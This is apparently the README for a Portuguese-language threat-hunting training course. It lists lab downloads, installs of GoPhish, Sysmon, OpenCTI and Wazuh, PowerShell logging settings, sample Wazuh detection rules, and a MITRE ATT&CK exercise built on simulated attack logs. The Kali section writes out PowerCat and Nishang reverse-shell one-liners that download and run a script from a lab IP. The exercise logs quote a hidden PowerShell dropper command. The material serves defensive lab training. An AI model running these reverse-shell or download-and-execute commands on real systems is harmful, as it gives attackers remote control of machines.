# THA-ADINT
Repositório de links para o Treinamento Threat Hunting Analist da ADINT School

## Módulo 00

## Download do Virtual Box, Extension Pack, Kali Linux, Metasploitable e ISOS(Windows e Ubuntu)

### VirtualBox Package and Virtual Box Extension Pack
https://www.virtualbox.org/wiki/Downloads

### Kali Download: 
https://www.kali.org/get-kali/#kali-virtual-machines

### Metasploitable:
https://drive.google.com/file/d/1QQwcYOcoKg4zAUEB0xS5urE53H4xWgv_/view?usp=drive_link

### Windows 10:
https://drive.google.com/file/d/12xLX9p-XiLgWqn1eLAse1OUe8QsqScqQ/view?usp=drive_link

### Ubuntu Server: 
https://ubuntu.com/download/server

## Kali Linux
### Atualização
```
$ sudo su
# apt update
# apt upgrade -y
```
### GoPhish
https://github.com/gophish/gophish
```
$ sudo mkdir /opt/git
$ sudo chown -R kali:kali /opt/git/
$ cd /opt/git
$ git clone https://github.com/gophish/gophish.git
$ cd gophish
$ ls -l
$ sudo apt install golang -y
$ go build
```
### PowerCat
https://github.com/besimorhino/powercat
```
$ mkdir ~/THA/
$ cd ~/THA/
$ wget https://raw.githubusercontent.com/besimorhino/powercat/refs/heads/master/powercat.ps1

IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.101/powercat.ps1'); powercat -c 192.168.56.101 -p 443 -e cmd
```
### Invoke-PowerShellTCP
https://github.com/samratashok/nishang
```
$ cd ~/THA/
$ wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1

Invoke-PowerShellTcp -Reverse -IPAddress 192.168.56.101 -Port 4444
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/Invoke-PowerShellTcp.ps1')
```

## Windows 10

### Habilitar Monitoramento de Logs do PowerShell
1. Ativar Transcrição de Comandos
Crie um script ou use PowerShell para registrar tudo que for digitado:
```
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Force
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "OutputDirectory" -Value "C:\Logs\PowerShell"
```
Isso criará logs de cada sessão PowerShell em C:\Logs\PowerShell.

2. Habilitar Logging Avançado de ScriptBlock
Esse recurso registra blocos de código malicioso ou suspeito:

```
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force 
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```
​
3. Ativar os Canais de Log no Visualizador de Eventos
Abra o PowerShell como administrador e execute:
```
wevtutil set-log "Microsoft-Windows-PowerShell/Operational" /enabled:true
```

### Instalar e Configurar o Sysmon
1. Baixar o Sysmon:
Acesse: Sysinternals Sysmon 
https://learn.microsoft.com/pt-br/sysinternals/downloads/sysmon

• Extraia o conteúdo em:  `C:\Tools\Sysmon`

2. Usar um Arquivo de Configuração Pronto
Você pode usar o modelo do SwiftOnSecurity:
```
curl -o sysmonconfig.xml https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml
```

3. Instalar o Sysmon com a Configuração
No prompt de comando como administrador:

```
cd C:\Tools\Sysmon
Sysmon64.exe -accepteula -i sysmonconfig.xml
```

4. Verificar se o Sysmon Está Funcionando
Abra o Visualizador de Eventos e vá até:
```
Aplicativos e Serviços > Microsoft > Windows > Sysmon > Operational
```
Você verá eventos como:

• ID 1 – Criação de processo

• ID 3 – Conexões de rede

• ID 11 – Criação de arquivos


### Office 2013
https://drive.google.com/file/d/11wmov4jpwOzQ2A0Rq0osQ4-YjdfsLTEV/view?usp=drive_link

## Ubuntu - OpenCTI

### OpenCTI

OpenCTI Docker

https://github.com/OpenCTI-Platform/docker

OpenCTI Documentation - Using Docker

https://docs.opencti.io/latest/deployment/installation/#using-docker

```
$ sudo apt install docker.io
$ sudo apt install docker-compose
$ sudo systemctl start docker
$ sudo mkdir /opt/git
$ sudo chown -R kali:kali /opt/git
$ cd /opt/git
$ git clone https://github.com/OpenCTI-Platform/docker.git
$ cd docker
$ ls -la
$ uuidgen
$ mv .env.sample .env
$ nano .env
$ sudo docker-compose up
$ sudo docker-compose down
```

https://github.com/OpenCTI-Platform/connectors

## Ubuntu - Wazuh

### Wazuh Install
https://wazuh.com/install/

### Wazuh Installation guide
https://documentation.wazuh.com/current/installation-guide/index.html

### Instalação do Wazuh 4.14 via script
```
curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh && sudo bash ./wazuh-install.sh --all-in-one --ignore-check --overwrite
```

##  Passos para Configurar Regras no Wazuh
Criar ou editar um arquivo de regras customizadas
• Caminho padrão no Wazuh Manager:
```
/var/ossec/etc/rules/local_rules.xml
```
​
Adicionar regras para eventos do PowerShell
Exemplo de regra para detectar uso do PowerShell:
```
<group name="windows,powershell,">
  <rule id="100100" level="10">
    <if_sid>61610</if_sid>
    <match>powershell.exe</match>
    <description>Execução do PowerShell detectada</description>
  </rule>
</group>
```
​61610 é o SID padrão para eventos de criação de processo no Windows.

Adicionar regras para eventos do Sysmon
Exemplo para detectar criação de processo (Sysmon Event ID 1):
```
<group name="windows,sysmon,">
  <rule id="100200" level="12">
    <if_sid>61610</if_sid>
    <match>EventID=1</match>
    <match>powershell.exe</match>
    <description>Sysmon - Execução de PowerShell detectada</description>
  </rule>
</group>
```
Você pode adaptar para outros eventos:
• ID 3: Conexões de rede
• ID 11: Criação de arquivos
• ID 13: Alterações de registro

Reiniciar o Wazuh Manager
Após salvar as regras:
```
sudo systemctl restart wazuh-manager
```
​
Verificar se as regras estão funcionando
• Use o dashboard do Wazuh ou o arquivo de log:
```
/var/ossec/logs/alerts/alerts.log
```


## 01 Fundamentos de Threat Hunter

### APT28 Fancy Bear
https://en.wikipedia.org/wiki/Fancy_Bear

### O grupo APT28 ataca agências governamentais ucranianas através do Signal usando malware
https://csirt.csi.cip.gov.ua/en/posts/apt28-attacks-ukrainian-government-agencies-via-signal-using-malware

### CTIR Gov - Centro de Prevenção, Tratamento e Resposta a Incidentes Cibernéticos de Governo
https://www.gov.br/ctir/pt-br/assuntos/noticias/2023/ameaca-cibernetica-ativa-emotet-e-trickbot

### app do Google
https://myaccount.google.com/apppasswords

### Teste Web
http://testphp.vulnweb.com/login.php

### Desafio 2: Mapeamento de TTPs com MITRE ATT&CK - Logs
```
1. Log de e-mail (Phishing inicial)
Fonte: Mail Gateway
Timestamp: 2025-10-04T08:15:23Z  
From: hr@secure-docs[.]org  
To: finance.director@targetcorp.com  
Subject: Atualização de política de benefícios 2025  
Attachment: Benefits_Update_2025.doc  
Verdict: Suspicious macro detected

2. Log de execução de macro (Office)
Fonte: Endpoint EDR
Timestamp: 2025-10-04T08:16:02Z  
Host: FINANCE-PC01  
Process: WINWORD.EXE  
Child Process: powershell.exe  
Command Line: powershell -exec bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://update-sync[.]org/dropper.ps1')"  
Verdict: Malicious PowerShell execution

4. Log de movimentação lateral via SMB
Fonte: Network Sensor (Zeek)
Timestamp: 2025-10-04T08:20:12Z  
Source IP: 10.0.5.21  
Destination IP: 10.0.5.45  
Protocol: SMB  
Action: File transfer – `update.ps1` copied to `\\10.0.5.45\C$\Users\Public\`  
Verdict: Lateral movement suspected

5. Log de exfiltração via HTTP/S
Fonte: Proxy Logs
Timestamp: 2025-10-04T08:25:33Z  
Host: FINANCE-PC01  
Destination: secure-data[.]net  
URL: https://secure-data[.]net/api/upload?session=abc123  
Payload Size: 4.2 MB  
Verdict: Unusual outbound data transfer

6. Log de beaconing (C2)
Fonte: Firewall Logs
Timestamp: 2025-10-04T08:30:00Z  
Source IP: 10.0.5.21  
Destination IP: 182.92.158.231  
Protocol: TCP  
Port: 443  
Frequency: Every 5 minutes  
Verdict: Persistent outbound connection to known APT10 infrastructure
```

### MITRE Navigator
https://mitre-attack.github.io/attack-navigator/

